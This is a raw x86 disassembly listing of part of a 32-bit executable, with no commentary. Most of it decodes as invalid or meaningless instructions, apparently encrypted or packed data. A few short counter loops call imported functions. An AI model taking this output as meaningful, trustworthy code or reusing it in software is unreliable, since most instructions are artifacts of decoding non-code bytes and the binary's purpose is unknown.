  407b41:	xchg   DWORD PTR [ebp+0x52],esi
  407b44:	inc    esi
  407b45:	mov    eax,ds:0xeebd8b00
  407b4a:	inc    ecx
  407b4b:	jb     0x407afb
  407b4d:	icebp  
  407b4e:	inc    ebp
  407b4f:	(bad)
  407b52:	outs   dx,BYTE PTR ds:[esi]
  407b53:	mov    esi,DWORD PTR [ebp-0x612a680f]
  407b59:	mov    ecx,0x27565031
  407b5f:	in     al,0xb6
  407b61:	popa   
  407b62:	(bad)  [ebx+0x797a8676]
  407b68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b69:	and    al,0xf5
  407b6b:	sub    eax,ebp
  407b6d:	shr    DWORD PTR [ebx-0x59416b11],0x13
  407b74:	xchg   edx,eax
  407b75:	sub    bl,bl
  407b77:	in     eax,dx
  407b78:	sub    esi,DWORD PTR [ecx]
  407b7a:	sar    BYTE PTR [eax],0xce
  407b7d:	imul   esp,DWORD PTR [esi-0x793f4258],0x1682eeee
  407b87:	mov    ebx,0xa001813d
  407b8c:	inc    esp
  407b8d:	rcl    BYTE PTR fs:[esi],0x16
  407b91:	test   BYTE PTR ds:0xda97066d,dl
  407b97:	clc    
  407b98:	test   DWORD PTR [edi+0x61917679],esi
  407b9e:	outs   dx,BYTE PTR ds:[esi]
  407b9f:	inc    edx
  407ba0:	fwait
  407ba1:	mov    ds:0xbaa39b33,eax
  407ba6:	inc    edx
  407ba7:	xchg   DWORD PTR [edx],ebp
  407ba9:	or     ecx,ebx
  407bab:	enter  0x436f,0x2a
  407baf:	and    eax,0x6b35e3da
  407bb4:	push   ecx
  407bb5:	pop    ecx
  407bb6:	add    esp,DWORD PTR fs:[esi]
  407bb9:	call   0x40db:0xac3d2867
  407bc0:	hlt    
  407bc1:	ror    DWORD PTR [edx+0x42],1
  407bc4:	stc    
  407bc5:	pop    es
  407bc6:	xor    al,0x6e
  407bc8:	ror    eax,1
  407bca:	neg    dl
  407bcc:	or     al,0x44
  407bce:	aaa    
  407bcf:	inc    ecx
  407bd0:	jmp    0xbb787bd7
  407bd5:	push   DWORD PTR [eax+eiz*2-0x2ce3187f]
  407bdc:	mov    ebx,DWORD PTR [ebx+0x7b]
  407bdf:	outs   dx,BYTE PTR ds:[esi]
  407be0:	xchg   esi,eax
  407be1:	repz pop esi
  407be3:	sbb    BYTE PTR [edi-0x5d],bl
  407be6:	jne    0x407b81
  407be8:	push   ebx
  407be9:	cli    
  407bea:	call   0x7c062fbe
  407bef:	or     al,0xce
  407bf1:	fld    TBYTE PTR [edx+edx*8]
  407bf4:	add    cl,BYTE PTR [ecx+0x3f3ea02a]
  407bfa:	hlt    
  407bfb:	mov    edi,DWORD PTR [ebx-0x48ddcfd5]
  407c01:	and    dl,ah
  407c03:	aaa    
  407c04:	dec    eax
  407c05:	cmc    
  407c06:	in     eax,dx
  407c07:	(bad)  
  407c08:	aam    0x93
  407c0a:	mov    eax,0x3fafb238
  407c0f:	adc    BYTE PTR [ebp+eax*1+0x4ae93456],bh
  407c16:	rol    BYTE PTR [esi],1
  407c18:	mov    bl,0x39
  407c1a:	or     cl,BYTE PTR [eax]
  407c1c:	jmp    DWORD PTR [edx]
  407c1e:	aas    
  407c1f:	fs jne 0x407c83
  407c22:	mov    esi,0x7b4ef2b3
  407c27:	pushf  
  407c28:	xchg   ecx,eax
  407c29:	jg     0x407c18
  407c2b:	jle    0x407c45
  407c2d:	pop    eax
  407c2e:	sbb    al,0x7b
  407c30:	fnstcw WORD PTR [ebx-0x38e52972]
  407c36:	jns    0x407bd4
  407c38:	lods   eax,DWORD PTR ds:[esi]
  407c39:	out    dx,eax
  407c3a:	xor    BYTE PTR [eax],dh
  407c3c:	dec    ecx
  407c3d:	fild   QWORD PTR [edx+edi*4]
  407c40:	ja     0x407bfd
  407c42:	mov    edi,DWORD PTR [ebx+0x69]
  407c45:	jnp    0x407c64
  407c47:	cs pop edx
  407c49:	push   esi
  407c4a:	jmp    0x26d0b9ea
  407c4f:	into   
  407c50:	sahf   
  407c51:	mov    bl,0xaf
  407c53:	jns    0x407cb9
  407c55:	shr    DWORD PTR [ebx+0x59],1
  407c58:	inc    ecx
  407c59:	mov    dh,cl
  407c5b:	xor    DWORD PTR [ebx],0xffffffd5
  407c5e:	mov    esp,0x14786c04
  407c63:	arpl   WORD PTR [ecx-0x36],bx
  407c66:	sahf   
  407c67:	xor    al,0xf
  407c69:	add    dl,BYTE PTR [eax]
  407c6b:	pushf  
  407c6c:	jg     0x407c92
  407c6e:	jne    0x407bfb
  407c70:	std    
  407c71:	jmp    0xd3e71cc4
  407c76:	jo     0x407c1b
  407c78:	or     ebp,esi
  407c7a:	adc    eax,0xc14a85fe
  407c7f:	inc    edx
  407c80:	aam    0x6
  407c82:	call   0x68f8:0x4e5492a0
  407c89:	addr16 inc ebx
  407c8b:	inc    ebx
  407c8c:	sbb    al,0x1e
  407c8e:	inc    ebp
  407c8f:	arpl   WORD PTR [edx-0x2bc1b84a],cx
  407c95:	or     DWORD PTR [ebx+0x6e74fad7],ebx
  407c9b:	mov    edx,0x47760fca
  407ca0:	add    BYTE PTR [edi],cl
  407ca2:	push   esp
  407ca3:	jp     0x407ca6
  407ca5:	and    ch,BYTE PTR [ebx]
  407ca7:	push   esp
  407ca8:	ins    DWORD PTR es:[edi],dx
  407ca9:	mov    al,0x9d
  407cab:	sub    BYTE PTR [ebx],bl
  407cad:	aas    
  407cae:	out    dx,al
  407caf:	mov    eax,0x9c2e076e
  407cb4:	iret   
  407cb5:	mov    eax,ds:0xfe5ddecc
  407cba:	inc    edx
  407cbb:	ds retf 
  407cbd:	jmp    0x34b49eff
  407cc2:	mov    eax,0x31cf13df
  407cc7:	xor    al,0x34
  407cc9:	shl    BYTE PTR [ebx-0x5e],1
  407ccc:	lock ins BYTE PTR es:[edi],dx
  407cce:	(bad)  
  407ccf:	mov    ds:0x5ee9c2a,al
  407cd4:	enter  0xefcf,0xe5
  407cd8:	fisubr DWORD PTR [edi+0x191387fe]
  407cde:	jp     0x407cf5
  407ce0:	loope  0x407d18
  407ce2:	sbb    dl,BYTE PTR [ebp-0x77]
  407ce5:	das    
  407ce6:	mov    eax,0x54cff61e
  407ceb:	fs push ss
  407ced:	jle    0x407cf5
  407cef:	js     0x407cb3
  407cf1:	dec    eax
  407cf2:	dec    esi
  407cf3:	shrd   ebx,ecx,cl
  407cf6:	loop   0x407d35
  407cf8:	mov    bh,0xba
  407cfa:	or     eax,0xc1233ba1
  407cff:	addr16 mov eax,ds:0xa91c
  407d03:	mov    ?,WORD PTR ds:0x671d6a00
  407d09:	sub    al,0x1e
  407d0b:	sbb    DWORD PTR [eax],esp
  407d0d:	out    0x7,al
  407d0f:	(bad)  
  407d10:	mov    cl,0x5b
  407d12:	loopne 0x407cc1
  407d14:	int    0xdc
  407d16:	in     eax,0xbb
  407d18:	mov    cl,0xc7
  407d1a:	inc    ebp
  407d1b:	les    edi,FWORD PTR [esi]
  407d1d:	test   DWORD PTR [eax+edi*8+0x438e05c7],ebx
  407d24:	inc    ebx
  407d25:	add    BYTE PTR [edx],bl
  407d27:	add    BYTE PTR [eax],al
  407d29:	add    BYTE PTR [ebx+0x43438e3d],al
  407d2f:	add    BYTE PTR [eax],al
  407d31:	je     0x407d7e
  407d37:	cmp    DWORD PTR ds:0x43438e,0x7
  407d3e:	jne    0x407d4c
  407d44:	push   0x9
  407d46:	call   DWORD PTR ds:0x4329ce
  407d4c:	cmp    DWORD PTR ds:0x43438e,0x8
  407d53:	jne    0x407d66
  407d59:	mov    edi,DWORD PTR ds:0x43438e
  407d5f:	dec    edi
  407d60:	mov    DWORD PTR ds:0x43438e,edi
  407d66:	mov    edi,DWORD PTR ds:0x43438e
  407d6c:	dec    edi
  407d6d:	mov    DWORD PTR ds:0x43438e,edi
  407d73:	jmp    0x407d2a
  407d78:	adc    DWORD PTR ds:0x432dce,ecx
  407d7e:	mov    edx,DWORD PTR [ebp+0x8]
  407d81:	xor    edx,eax
  407d83:	sbb    edi,DWORD PTR ds:0x43439a
  407d89:	mov    edi,DWORD PTR [ebp-0x10]
  407d8c:	add    edx,ecx
  407d8e:	cmp    edi,edx
  407d90:	jmp    0x407fa4
  407d95:	mov    BYTE PTR [ebp+0x51b14fb4],ch
  407d9b:	jae    0x407e12
  407d9d:	xchg   esp,eax
  407d9e:	xor    al,0x31
  407da0:	xchg   BYTE PTR [eax+0x4d256cb8],bh
  407da6:	retf   0x7070
  407da9:	imul   edi,DWORD PTR [edi+0x70],0xafab2870
  407db0:	inc    edx
  407db1:	jo     0x407df3
  407db3:	or     eax,DWORD PTR [esi+eax*1]
  407db6:	mov    al,ds:0xebe5d63
  407dbb:	xor    eax,0xff82e19e
  407dc0:	into   
  407dc1:	scas   eax,DWORD PTR es:[edi]
  407dc2:	(bad)  
  407dc3:	jle    0x407d95
  407dc5:	arpl   ax,bp
  407dc7:	xor    DWORD PTR [esi+eax*2],eax
  407dca:	jmp    0x796ba431
  407dcf:	push   esi
  407dd0:	aas    
  407dd1:	sub    BYTE PTR [eax],ch
  407dd3:	and    eax,DWORD PTR [ebp+0xeed890b]
  407dd9:	mov    eax,0x41add30e
  407dde:	sub    DWORD PTR [edx-0x36c7fcd2],esp
  407de4:	sahf   
  407de5:	jnp    0x407dff
  407de7:	inc    ebx
  407de8:	ret    0xd457
  407deb:	fwait
  407dec:	push   ds
  407ded:	inc    ecx
  407dee:	frstor [ecx]
  407df0:	push   ds
  407df1:	lock in eax,dx
  407df3:	in     al,0x8
  407df5:	(bad)  
  407df6:	rcl    DWORD PTR [edi+edi*8],cl
  407df9:	adc    DWORD PTR [edi+eax*8],0x8402b892
  407e00:	and    eax,0x8b54b534
  407e05:	bound  ebp,QWORD PTR ss:[eax]
  407e08:	popa   
  407e09:	pop    ebp
  407e0a:	ins    BYTE PTR es:[edi],dx
  407e0b:	inc    ebp
  407e0c:	sbb    bh,bl
  407e0e:	cld    
  407e0f:	and    eax,0x5bc66150
  407e14:	push   ss
  407e15:	icebp  
  407e16:	mov    dh,0x67
  407e18:	lds    ebp,FWORD PTR ds:0x669dbeb9
  407e1e:	mov    ebx,DWORD PTR [ecx+0x56]
  407e21:	fnstsw WORD PTR [esi-0x46]
  407e24:	outs   dx,BYTE PTR ds:[esi]
  407e25:	test   eax,0x5ec8319f
  407e2a:	iret   
  407e2b:	shl    dl,cl
  407e2d:	data16 (bad) 
  407e2f:	std    
  407e30:	push   cs
  407e31:	aaa    
  407e32:	sub    DWORD PTR [ecx+0x71],eax
  407e35:	jle    0x407dd7
  407e37:	stos   BYTE PTR es:[edi],al
  407e38:	pop    ebp
  407e39:	dec    ebp
  407e3a:	aaa    
  407e3b:	test   eax,0xc129a92a
  407e40:	in     eax,dx
  407e41:	(bad)  
  407e42:	outs   dx,BYTE PTR ds:[esi]
  407e43:	(bad)  
  407e44:	shl    DWORD PTR ds:0x140c9bf2,cl
  407e4a:	jb     0x407e1f
  407e4c:	ins    DWORD PTR es:[edi],dx
  407e4d:	inc    esp
  407e4e:	in     eax,0xf9
  407e50:	ja     0x407e19
  407e52:	dec    esi
  407e53:	aas    
  407e54:	jae    0x407e93
  407e56:	adc    eax,0xb576a85c
  407e5b:	mov    ah,0xc4
  407e5d:	jle    0x407df9
  407e5f:	xor    al,0x5f
  407e61:	mov    dl,0x74
  407e63:	fs ins DWORD PTR es:[edi],dx
  407e65:	mov    dh,0xd0
  407e67:	dec    ebx
  407e68:	cmc    
  407e69:	cwde   
  407e6a:	jl     0x407eab
  407e6c:	xor    al,0xdf
  407e6e:	pop    ss
  407e6f:	fadd   QWORD PTR [esi]
  407e71:	add    DWORD PTR [esi],ecx
  407e73:	jne    0x407ed7
  407e75:	mov    ss,WORD PTR [ecx-0x4cb344c5]
  407e7b:	mov    ah,0xd2
  407e7e:	inc    ecx
  407e7f:	stc    
  407e80:	jmp    0x75b16170
  407e85:	scas   eax,DWORD PTR es:[edi]
  407e86:	jmp    0xd611ea5f
  407e8b:	(bad)  
  407e8d:	cmp    al,0xf8
  407e8f:	(bad)  
  407e91:	inc    esi
  407e92:	push   ebx
  407e93:	fisttp WORD PTR ss:[edx]
  407e96:	xchg   edi,eax
  407e97:	test   al,0x8e
  407e99:	adc    eax,0x31f836cc
  407e9f:	cmp    ch,BYTE PTR [edx+0x1f]
  407ea2:	jp     0x407ead
  407ea4:	fcmovnbe st,st(0)
  407ea6:	pop    ebp
  407ea7:	xchg   edx,eax
  407ea8:	es push edi
  407eaa:	mov    cl,0xf3
  407eac:	ror    BYTE PTR [esi-0x7],cl
  407eaf:	and    edi,ecx
  407eb1:	loope  0x407f21
  407eb3:	stc    
  407eb4:	adc    eax,0x74088e8b
  407eb9:	or     ch,ch
  407ebb:	js     0x407e85
  407ebd:	jo     0x407e59
  407ebf:	stos   BYTE PTR es:[edi],al
  407ec0:	ret    0x5737
  407ec3:	cmp    ebp,DWORD PTR [ecx]
  407ec5:	iret   
  407ec6:	cli    
  407ec7:	pusha  
  407ec8:	push   ds
  407ec9:	inc    eax
  407eca:	test   al,0xe8
  407ecc:	or     eax,0x4c71a38d
  407ed1:	popf   
  407ed2:	test   BYTE PTR [ebp+0x5de7207f],dl
  407ed8:	adc    ecx,DWORD PTR [eax]
  407eda:	aaa    
  407edb:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  407edd:	adc    al,BYTE PTR [edx+ebx*4+0x17]
  407ee1:	mov    bl,0x8b
  407ee3:	push   eax
  407ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ee6:	and    BYTE PTR [edx],al
  407ee8:	inc    edx
  407ee9:	ss popf 
  407eeb:	into   
  407eec:	xchg   ecx,eax
  407eed:	jl     0x407f16
  407eef:	jge    0x407e72
  407ef1:	jecxz  0x407e9d
  407ef3:	push   es
  407ef4:	ret    0x913f
  407ef7:	pop    ss
  407ef8:	adc    eax,0x7e126bdd
  407efd:	les    esi,FWORD PTR [edi+esi*4-0x7c5140a2]
  407f04:	mov    ebp,0x1bdabb35
  407f09:	(bad)  
  407f0a:	in     eax,dx
  407f0b:	aaa    
  407f0c:	cld    
  407f0d:	mov    eax,0x26a928fa
  407f12:	mov    edx,0xbb1107ea
  407f17:	shl    DWORD PTR [eax-0x4e],0x3b
  407f1b:	das    
  407f1c:	add    ebp,eax
  407f1e:	hlt    
  407f1f:	sbb    BYTE PTR [ebx],dh
  407f21:	sbb    ch,bh
  407f23:	dec    ebp
  407f24:	cmp    DWORD PTR [edi-0x7fd0394c],edi
  407f2a:	arpl   WORD PTR [edi],ax
  407f2c:	xchg   ebp,esi
  407f2e:	pop    edi
  407f2f:	push   0xffffffad
  407f31:	cmp    DWORD PTR [eax-0x54],esi
  407f34:	pop    es
  407f35:	icebp  
  407f36:	cmp    al,0xc4
  407f38:	ins    DWORD PTR es:[edi],dx
  407f39:	sbb    BYTE PTR [eax+0x5fde103e],0xd2
  407f40:	loopne 0x407f4c
  407f42:	push   cs
  407f43:	retf   0xde0d
  407f46:	cmp    eax,0x3c72e2db
  407f4b:	mov    ah,bh
  407f4d:	ds scas eax,DWORD PTR es:[edi]
  407f4f:	idiv   BYTE PTR [ecx-0x125ee1e6]
  407f55:	(bad)  
  407f56:	loope  0x407fb5
  407f58:	add    DWORD PTR [ebx+ebp*1],ebx
  407f5b:	add    cl,BYTE PTR [ebx+ebx*2-0x3c57b7bf]
  407f62:	push   edx
  407f63:	aas    
  407f64:	jns    0x407fd0
  407f66:	pop    ebp
  407f67:	lock jecxz 0x407f39
  407f6a:	stos   BYTE PTR es:[edi],al
  407f6b:	outs   dx,DWORD PTR ds:[esi]
  407f6c:	adc    al,0x90
  407f6e:	mov    esi,0x94fd03ef
  407f73:	sti    
  407f74:	fisub  DWORD PTR [eax-0x53]
  407f77:	jnp    0x407f36
  407f79:	push   eax
  407f7a:	jl     0x407f46
  407f7c:	clc    
  407f7d:	mov    edi,0x7a908b4c
  407f82:	lds    esp,FWORD PTR [edi-0x79]
  407f85:	in     eax,dx
  407f86:	(bad)  
  407f88:	call   FWORD PTR [esi]
  407f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8b:	cdq    
  407f8c:	scas   al,BYTE PTR es:[edi]
  407f8d:	and    BYTE PTR [ecx],0xb9
  407f90:	pop    esp
  407f91:	(bad)  
  407f92:	int    0xed
  407f94:	adc    BYTE PTR [ebx-0x17],al
  407f97:	mov    eax,ds:0xcd87a69c
  407f9c:	aad    0x6b
  407f9e:	push   esi
  407f9f:	je     0x407fbe
  407fa1:	das    
  407fa2:	pop    esp
  407fa3:	dec    ebp
  407fa4:	je     0x409cf3
  407faa:	push   ebx
  407fab:	mov    DWORD PTR ds:0x43437a,0x643a
  407fb5:	jmp    0x409aba
  407fba:	mov    DWORD PTR ds:0x432708,0x445
  407fc4:	mov    edx,DWORD PTR [ebp-0x8]
  407fc7:	and    DWORD PTR ds:0x43438a,0x0
  407fd1:	jmp    0x407fe5
  407fd6:	xor    edi,edi
  407fd8:	or     edi,DWORD PTR ds:0x43438a
  407fde:	inc    edi
  407fdf:	mov    DWORD PTR ds:0x43438a,edi
  407fe5:	cmp    DWORD PTR ds:0x43438a,0x18
  407fec:	jae    0x40802f
  407ff2:	cmp    DWORD PTR ds:0x43438a,0xc
  407ff9:	jne    0x40800a
  407fff:	push   0x7154
  408004:	call   DWORD PTR ds:0x432c3e
  40800a:	cmp    DWORD PTR ds:0x43438a,0xb
  408011:	jne    0x408024
  408017:	mov    edi,DWORD PTR ds:0x43438a
  40801d:	inc    edi
  40801e:	mov    DWORD PTR ds:0x43438a,edi
  408024:	jmp    0x407fd6
  408029:	xor    DWORD PTR ds:0x43439e,ecx
  40802f:	mov    edi,DWORD PTR [ebp-0x10]
  408032:	jmp    0x408246
  408037:	(bad)  
  408038:	jmp    0x408005
  40803a:	adc    ebp,DWORD PTR [ecx+0x33]
  40803d:	inc    esi
  40803e:	jno    0x40804f
  408040:	pushf  
  408041:	jo     0x407fca
  408043:	dec    ecx
  408044:	cld    
  408045:	(bad)  
  408046:	adc    al,BYTE PTR [esi-0x38]
  408049:	jo     0x4080bb
  40804b:	imul   edi,DWORD PTR [edi+0x70],0x5dc5c570
  408052:	(bad)  
  408054:	sub    al,0xb0
  408056:	mov    ebx,0x890518c
  40805b:	jb     0x40804a
  40805d:	mov    al,0x21
  40805f:	sub    DWORD PTR [ebx],ecx
  408061:	sar    BYTE PTR [esp+edx*8+0x6e21a10],cl
  408068:	xor    BYTE PTR [edx],cl
  40806a:	inc    ecx
  40806b:	xor    DWORD PTR [eax-0x47],ecx
  40806e:	push   ebx
  40806f:	ins    DWORD PTR es:[edi],dx
  408070:	dec    esp
  408071:	dec    eax
  408072:	mov    ah,0x10
  408074:	aad    0xe6
  408076:	pop    ss
  408077:	jo     0x408096
  408079:	mov    ds:0x63f4e2bc,eax
  40807e:	outs   dx,BYTE PTR ds:[esi]
  40807f:	je     0x40805b
  408081:	loope  0x4080e4
  408083:	and    BYTE PTR [ebp+0x3566a3be],bh
  408089:	pop    ecx
  40808a:	(bad)  [eax]
  40808c:	(bad)  
  40808d:	ja     0x408088
  40808f:	mov    BYTE PTR [ecx-0x14],dl
  408092:	test   al,0xdc
  408094:	lods   al,BYTE PTR ds:[esi]
  408095:	stos   BYTE PTR es:[edi],al
  408096:	push   ss
  408097:	lods   eax,DWORD PTR ds:[esi]
  408098:	add    eax,0xe7d77b41
  40809d:	add    ecx,DWORD PTR [ebx]
  40809f:	cmp    eax,0x21490ca7
  4080a4:	inc    ebp
  4080a5:	adc    eax,0x589255b3
  4080aa:	into   
  4080ab:	push   0x5773ad0b
  4080b0:	aas    
  4080b1:	aam    0xc4
  4080b3:	pushf  
  4080b4:	scas   al,BYTE PTR es:[edi]
  4080b5:	or     BYTE PTR [ebx],ah
  4080b7:	fst    QWORD PTR [esi]
  4080b9:	fs inc esp
  4080bb:	sbb    BYTE PTR [ecx+edx*2],cl
  4080be:	data16 sbb dl,BYTE PTR [eax]
  4080c1:	das    
  4080c2:	pop    ebx
  4080c3:	aas    
  4080c4:	mov    ah,0x69
  4080c6:	fidiv  WORD PTR [ebp-0x41bf3b45]
  4080cc:	pop    ss
  4080cd:	adc    esp,DWORD PTR [ebx-0x68]
  4080d0:	mov    ds:0x2bb6463,eax
  4080d5:	push   edx
  4080d6:	jb     0x40813c
  4080d8:	sub    BYTE PTR ss:[esi-0x579859a3],0xee
  4080e0:	push   ebx
  4080e1:	add    bl,BYTE PTR [ebx+eiz*2]
  4080e4:	or     al,0x25
  4080e6:	imul   ebp,DWORD PTR [edx],0xdc73a5d
  4080ec:	dec    ecx
  4080ed:	dec    eax
  4080ee:	test   edx,eax
  4080f0:	cmp    eax,0x2833fb0f
  4080f5:	push   edx
  4080f6:	jge    0x408115
  4080f8:	sub    eax,0xc8a075a6
  4080fd:	jb     0x408173
  4080ff:	push   esp
  408100:	retf   
  408101:	dec    esi
  408102:	ret    0x61a
  408105:	mov    DWORD PTR [edx],esp
  408107:	sahf   
  408108:	push   ecx
  408109:	add    BYTE PTR [ecx-0x36],0x98
  40810d:	jmp    0x40814c
  40810f:	dec    ebx
  408110:	leave  
  408111:	rcl    BYTE PTR [ebp-0x4c0f7c03],1
  408117:	push   ss
  408118:	jmp    0xc5e2:0xc06a7aca
  40811f:	cld    
  408120:	in     al,dx
  408121:	mov    BYTE PTR [esi-0x3f6d4ac9],al
  408127:	dec    esp
  408128:	jecxz  0x408195
  40812a:	repz js 0x408158
  40812d:	xchg   BYTE PTR [ecx+0x15],cl
  408130:	cli    
  408131:	push   esp
  408132:	mov    ecx,DWORD PTR [esi-0x31]
  408135:	fidiv  WORD PTR [ebp-0x1b]
  408138:	out    dx,eax
  408139:	jmp    0xd374:0xe6f84811
  408140:	icebp  
  408141:	sbb    esi,edi
  408143:	ja     0x40811b
  408145:	sub    eax,0x2face95b
  40814a:	es stos DWORD PTR es:[edi],eax
  40814c:	and    al,0x1e
  40814e:	mov    ds:0x5263ebb,eax
  408153:	and    eax,0xaba32620
  408158:	jns    0x4080ed
  40815a:	mov    esi,0x53735e18
  40815f:	push   esp
  408160:	cld    
  408161:	and    eax,0x912b8828
  408166:	(bad)  
  408167:	addr16 adc edx,0xfffffff2
  40816b:	push   es
  40816c:	xor    esp,esi
  40816e:	in     eax,dx
  40816f:	dec    ebp
  408170:	pop    ss
  408171:	pop    ecx
  408172:	xor    al,0x4f
  408174:	retf   0x84a0
  408177:	mov    ecx,0xbea66e6e
  40817c:	sbb    BYTE PTR [edx],ah
  40817e:	lahf   
  40817f:	adc    ecx,DWORD PTR [ebp-0x3b5a94f8]
  408185:	out    dx,al
  408186:	ds inc ebp
  408188:	fsubr  QWORD PTR [ebx+0x2adc4f38]
  40818e:	xor    DWORD PTR [edx],edi
  408190:	outs   dx,BYTE PTR ds:[esi]
  408191:	jecxz  0x408116
  408193:	inc    esi
  408194:	ds cmp eax,0xbe8634de
  40819a:	es mov edi,edi
  40819d:	jmp    0x408153
  40819f:	js     0x4081b7
  4081a1:	cli    
  4081a2:	call   0x992b:0x104cb02d
  4081a9:	pop    esi
  4081aa:	into   
  4081ab:	mov    eax,0x20b9302c
  4081b0:	mov    ecx,0xa30bfaa5
  4081b5:	xor    eax,0x3107aa0
  4081ba:	push   edx
  4081bb:	add    DWORD PTR [edi+0x196d5628],ecx
  4081c1:	push   cs
  4081c2:	iret   
  4081c3:	pop    esp
  4081c4:	jmp    0x408210
  4081c6:	stc    
  4081c7:	cmp    al,0x8
  4081c9:	mov    cl,0x78
  4081cb:	mov    eax,ds:0x34f0d6b9
  4081d0:	mov    esi,DWORD PTR [ebx+0x5e]
  4081d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081d4:	(bad)  
  4081d5:	xchg   edx,eax
  4081d6:	mov    cl,0xa3
  4081d8:	lods   eax,DWORD PTR ds:[esi]
  4081d9:	fwait
  4081da:	test   eax,0x21fa8aa4
  4081df:	push   eax
  4081e0:	shr    BYTE PTR [ebp-0x2],1
  4081e3:	ins    BYTE PTR es:[edi],dx
  4081e4:	loopne 0x40817b
  4081e6:	push   edx
  4081e7:	and    BYTE PTR [ebp-0x401eba24],bl
  4081ed:	jbe    0x408250
  4081ef:	lock and eax,0x5480a7e3
  4081f5:	pop    ss
  4081f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f7:	adc    eax,0xc6592b08
  4081fc:	dec    edi
  4081fd:	outs   dx,BYTE PTR ds:[esi]
  4081fe:	dec    edx
  4081ff:	push   es
  408200:	fwait
  408201:	loope  0x408183
  408203:	hlt    
  408204:	xor    al,BYTE PTR [ecx+0x46021249]
  40820a:	fidiv  DWORD PTR [eax]
  40820c:	test   BYTE PTR [esi+ebp*4],0x72
  408210:	sub    ecx,DWORD PTR [edx+0x55]
  408213:	inc    ecx
  408214:	into   
  408215:	outs   dx,BYTE PTR ds:[esi]
  408216:	xor    DWORD PTR [edx],ebp
  408218:	sbb    eax,0x7fd16391
  40821d:	fst    DWORD PTR [ecx-0x41]
  408220:	loopne 0x408268
  408222:	pop    edi
  408223:	test   eax,0xbffb3171
  408228:	cs push ebp
  40822a:	mov    ebp,0xa649f48
  40822f:	push   ebp
  408230:	xchg   esp,eax
  408231:	and    eax,DWORD PTR [edx+0x27]
  408234:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408236:	jmp    0xaa5:0x26dff77
  40823d:	ss icebp 
  40823f:	sub    BYTE PTR [esi-0xeef23bc],0x63
  408246:	sub    edi,edx
  408248:	mov    edx,DWORD PTR [ebp-0x4]
  40824b:	xor    edx,eax
  40824d:	sbb    DWORD PTR ds:0x432de2,0x10fd
  408257:	add    edx,ecx
  408259:	mov    DWORD PTR ds:0x434372,0xe69
  408263:	cmp    edi,edx
  408265:	mov    DWORD PTR ds:0x434386,0xfd5
  40826f:	jmp    0x408483
  408274:	sbb    DWORD PTR [edi+eiz*4],ebp
  408277:	pop    edx
  408278:	mov    ch,0x71
  40827a:	loope  0x4082e7
  40827c:	push   ebx
  40827d:	inc    edx
  40827e:	test   al,0x19
  408280:	xor    al,0x23
  408282:	ins    DWORD PTR es:[edi],dx
  408283:	mov    WORD PTR [edi+0x697070d6],?
  408289:	jg     0x4082fb
  40828b:	jo     0x40830b
  40828d:	sub    al,0x15
  40828f:	mov    esp,0xdec926da
  408294:	xor    eax,0x1fbc7c93
  408299:	dec    eax
  40829a:	sub    esp,esp
  40829c:	push   ds
  40829d:	cmp    al,0xb8
  40829f:	jno    0x4082e5
  4082a1:	fild   WORD PTR [edx+0x64e73ac0]
  4082a7:	jmp    0xb945:0xd2bb5abe
  4082ae:	ret    
  4082af:	inc    ebx
  4082b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082b1:	lock test eax,0xbe38a2f4
  4082b7:	shl    esp,cl
  4082b9:	pop    esi
  4082ba:	mov    ebx,0xbd82b791
  4082bf:	or     dl,BYTE PTR [ecx+0x5066ce93]
  4082c5:	outs   dx,BYTE PTR ds:[esi]
  4082c6:	mov    ds:0xbcfb41a2,eax
  4082cb:	je     0x4082cc
  4082cd:	out    0x39,eax
  4082cf:	mov    bl,0x70
  4082d1:	popa   
  4082d2:	in     eax,dx
  4082d3:	mov    ah,0x19
  4082d5:	xchg   esp,eax
  4082d6:	push   cs
  4082d7:	cld    
  4082d8:	outs   dx,DWORD PTR ds:[esi]
  4082da:	xor    dh,dh
  4082dc:	mov    bl,0x5a
  4082de:	lods   eax,DWORD PTR ds:[esi]
  4082df:	outs   dx,BYTE PTR ds:[esi]
  4082e0:	pop    eax
  4082e1:	pop    ds
  4082e2:	jmp    0x30e273d6
  4082e7:	mov    ch,0xbb
  4082e9:	jno    0x40833d
  4082eb:	mov    ecx,0x7e3e324e
  4082f0:	fisubr DWORD PTR [ebp-0x7ff730f5]
  4082f6:	xchg   edi,eax
  4082f7:	aas    
  4082f8:	stos   BYTE PTR es:[edi],al
  4082f9:	xor    dh,al
  4082fb:	dec    ecx
  4082fc:	cmp    bl,BYTE PTR [eax]
  4082fe:	js     0x40828a
  408300:	dec    ebp
  408301:	pop    es
  408302:	in     eax,0xc6
  408304:	loop   0x408344
  408306:	(bad)  
  408307:	mov    ebx,0xf10989ef
  40830c:	jg     0x4082e4
  40830e:	dec    ebp
  40830f:	imul   BYTE PTR [ebx-0x62]
  408312:	mov    bh,0x8f
  408314:	cmp    edx,DWORD PTR [ebp-0x26c56d3b]
  40831a:	add    al,0xc5
  40831c:	mov    bl,0x35
  40831e:	dec    ebx
  40831f:	mov    ebx,0x750a874a
  408324:	cdq    
  408325:	push   es
  408326:	aas    
  408327:	sbb    edx,ecx
  408329:	fucomp st(7)
  40832b:	push   edx
  40832c:	inc    ebx
  40832d:	cmp    eax,0x4274f5e4
  408332:	mov    ebx,0xc78f71b0
  408337:	pop    esi
  408338:	push   edx
  408339:	sbb    DWORD PTR [esi],edx
  40833b:	dec    eax
  40833c:	jbe    0x4082d5
  40833e:	sub    eax,0xdcb9f5c5
  408343:	or     esi,edx
  408345:	and    BYTE PTR [eax*2-0x2638aa0c],ah
  40834c:	(bad)  
  40834d:	in     eax,0xc6
  40834f:	inc    esp
  408350:	fidiv  DWORD PTR [esi+0x59]
  408353:	pop    ds
  408354:	inc    edi
  408355:	mov    dl,0xfd
  408357:	mov    edi,0xcc33ed24
  40835c:	shl    al,0x7f
  40835f:	or     BYTE PTR [esi+edx*2+0x4e],ch
  408363:	int3   
  408364:	sub    DWORD PTR [ebp+0x2437c2a],0x5a
  40836b:	popa   
  40836c:	nop
  40836d:	hlt    
  40836e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40836f:	stos   BYTE PTR es:[edi],al
